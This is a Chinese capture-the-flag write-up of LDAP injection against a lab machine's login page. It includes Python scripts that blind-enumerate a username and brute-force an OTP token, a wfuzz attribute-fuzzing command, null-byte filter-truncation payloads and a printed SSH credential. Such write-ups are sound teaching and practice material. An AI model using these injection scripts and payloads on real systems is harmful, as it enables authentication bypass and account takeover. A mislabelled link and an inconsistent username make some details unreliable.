先来看LDAP注入的最基本形式
    (&
        (password=1234)
        (uid=ca01h%00)
    )
具体到这个靶机的话，我们需要猜解括号的个数。运用类似盲注的思想，如果注入成功，那么就会返回`User ca01h not found`。
假设只有一个括号：
假设有两个括号：
假设有三个括号：
当尝试到三个括号用于闭合时，成功返回了`User ca01h%29%29%29%00 not found`，那么这个登录框的LDAP查询的基本形式就是
    (&
        (&
            (password=1234)
            (uid=ca01h)))%00
        )
        (&|
            (other comparing)
        )
    )
接着，我们再回头去看一下Fuzz出来的被过滤的字符，其中`%25%2a`返回的消息长度为231 Words
发现回显的消息是`Cannot login`，说明可以用`*`通配符来盲注用户名，脚本如下：
    #!/usr/bin/env python3
    ### username_burp.py
    import sys
    import time
    from string import ascii_lowercase
    from urllib.parse import quote_plus
    import requests
    URL = 'http://10.10.10.122/login.php'
    username, done = '', False
    print()
    while not done:
        for c in ascii_lowercase:
            payload = username + c + quote_plus('*')
            data = {
                'inputUsername': payload,
                'inputOTP': '1234'
            }
            resp = requests.post(URL, data=data)
            if 'Cannot login' in resp.text:
                username += c
                break
            sys.stdout.write(f'\r{username}{c}')
            time.sleep(0.2)
        else:
            done = True
    print(f'[+] Username: {username} \n')
用户名为`ldapuser`
知道了用户名之后，我们就要去获取生成OTP的81位token，通过页面源代码的提示，这个token存储在某一个LDAP默认已经存在的属性当中。而默认的属性可以在[PayloadsAllTheThings](https://www.youtube.com/watch?v=51JQg202csw)中找到：
    c
    cn
    co
    commonName
    dc
    facsimileTelephoneNumber
    givenName
    gn
    homePhone
    id
    jpegPhoto
    l
    mail
    mobile
    name
    o
    objectClass
    ou
    owner
    pager
    password
    sn
    st
    surname
    uid
    username
    userPassword
如果不想写脚本的话用wfuzz来Fuzz靶机的LDAP中存在的属性可能会更快一些，但还是要先找到注入的形式：
    (&
        (&
            (password=1234)
            (uid=ldapuser)
            (FUZZ=*)
        )
        (&|
            (other comparing)
        )
    )
此外还要把注入的字符`ldapuser)(FUZZ=*`进行二次URL编码，编码之后的结果`ldapuser%2529%2528FUZZ%253d%252a`。
    wfuzz -c --hw 233 -d 'inputUsername=ldapuser%2529%2528FUZZ%253d%252a&inputOTP=1234' -w LDAP_attributes.txt http://10.10.10.122/login.php
我们Fuzz出来了这么些属性是存在于靶机的LDAP服务中的，现在的工作就是一个一个的属性来猜解，属于一些重复性的工作，就不在这里过多赘述了，最后可以找到token是存储于pager属性中。接着写脚本用来burp81位token
    #!/usr/bin/python3
    # pager_burp.py
    import requests
    import sys
    from time import sleep
    from string import digits
    token = ""
    URL = "http://10.10.10.122/login.php"
    attribute = "pager"
    loop = 1
    while loop > 0:
        for digit in digits:
            token = token
            # ldapuser)(pager=)*
            payload = f"ldapuser%29%28{attribute}%3d{token}{digit}%2a"
            data = {"inputUsername": payload, "inputOTP": "1234"}
            r = requests.post(URL, data=data)
            sys.stdout.write(f"\rToken: {token}{digit}")
            sleep(0.5)
            if b"Cannot login" in r.content:
                token += digit
                break
            elif digit == "9":
                loop = 0
                break
    print(f'[+] Token: {token} \n')
这里值得注意的是需要删掉最后的一个9，所以最后的token就是：
    285449490011357156531651545652335570713167411445727140604172141456711102716717000
接着用stoken工具导入token
生成OTP
成功登录后，跳转到`page.php`页面，可以执行命令
Damn it…..提示我们`ldapuser`权限不够不能执行命令，这里有两种办法：
  * 对`group`属性进行注入，即把后面group属性的filter截断 
        (&
        (&
            (pager=)
            (uid=ldapuser)))%00
        )
        (|
            (group=root)
            (group=adm)
        )
    )
  * 使用`*`通配符作为用户名登录
这里演示一下第一种方案，payload直接放到burp中
    ldapuser%2529%2529%2529%2500
再去执行ls命令
读取page.php文件：
SSH登录：`fdapuser:e398e27d5c4ad45086fe431120932a01`